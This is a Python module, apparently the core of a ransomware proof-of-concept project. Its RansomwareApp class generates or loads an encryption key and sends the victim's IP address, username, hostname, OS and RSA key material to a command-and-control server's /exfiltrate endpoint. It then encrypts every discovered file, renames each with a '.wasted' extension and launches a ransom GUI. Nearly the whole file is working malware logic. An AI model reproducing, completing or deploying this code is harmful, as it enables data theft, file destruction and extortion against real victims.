from ransomware.config import AppConfig
from ransomware.logging import logger
from ransomware.discovery.discoverer import FileDiscoverer
from ransomware.crypto.encryptor import Encryptor
from ransomware.crypto.keys import Keys
from ransomware.network.client import NetworkClient
from ransomware.exceptions import RansomwareError
from ransomware.gui.main import RansomwareGUI
import os
from typing import Optional
import sys
import platform
import getpass
import requests

class RansomwareApp:
    """
    Main application class for orchestrating ransomware operations:
    - Key management
    - File discovery
    - Encryption/Decryption
    - Network communication
    - GUI launch
    """
    def __init__(self, config: AppConfig):
        """
        Initialize the RansomwareApp with configuration and dependencies.
        """
        self.config = config
        self.logger = logger
        self.network_client = NetworkClient(config)
        self.key = None
        self.encryptor: Optional[Encryptor] = None

    def setup_key(self):
        """
        Load or generate the encryption key and initialize the Encryptor.
        """
        if os.path.exists(self.config.encryption_key_path):
            self.key = Keys.load_key(self.config.encryption_key_path)
        else:
            self.key = Encryptor.generate_key()
            Keys.save_key(self.config.encryption_key_path, self.key)
        self.encryptor = Encryptor(self.key)
        logger.info("Encryption key loaded and encryptor initialized.")

    def exfiltrate_to_c2(self, root_dir: str):
        """
        Send exfiltration data to the C2 server using HTTP POST.
        """
        data = {
            "ip_address": self.get_local_ip(),
            "operating_system": platform.system(),
            "private_key": self.config.server_private_rsa_key or "",
            "public_key": self.config.server_public_rsa_key or "",
            "username": getpass.getuser(),
            "hostname": platform.node(),
            "target_directory": root_dir
        }
        url = f"{self.config.c2_server_url.rstrip('/')}/exfiltrate"
        try:
            response = requests.post(url, json=data, timeout=self.config.timeout)
            response.raise_for_status()
            logger.info(f"Exfiltration data sent to C2 server at {url}")
        except Exception as e:
            logger.error(f"Failed to exfiltrate data to C2 server: {e}")

    @staticmethod
    def get_local_ip():
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return 'Unknown'

    def run_process(self, root_dir: str, encrypt: bool = True, extension: str = ".wasted"):
        """
        Discover files and perform encryption or decryption, then launch the GUI if encrypting.
        """
        self.setup_key()
        # Exfiltrate data to C2 server before encryption
        if encrypt:
            self.exfiltrate_to_c2(root_dir)
        discoverer = FileDiscoverer(root_dir)
        files = discoverer.discover_files()
        logger.info(f"Processing {len(files)} files in {root_dir}")
        for file in files:
            try:
                if encrypt and not file.endswith(extension):
                    self.encryptor.encrypt_file(file)
                    os.rename(file, file + extension)
                elif not encrypt and file.endswith(extension):
                    self.encryptor.decrypt_file(file)
                    os.rename(file, file[:-len(extension)])
            except Exception as e:
                logger.error(f"Failed to process {file}: {e}")
        logger.info("Processing complete.")
        # Launch GUI after encryption
        if encrypt:
            decrypt_cmd = [sys.executable, sys.argv[0], "-p", root_dir, "-d"]
            gui = RansomwareGUI(target_dir=root_dir, decrypt_cmd=decrypt_cmd)
            gui.mainloop()

    def run(self):
        """
        Placeholder for future orchestration logic.
        """
        logger.info("Starting Ransomware PoC...")
        # Orchestrate discovery, encryption, networking, etc.
        pass 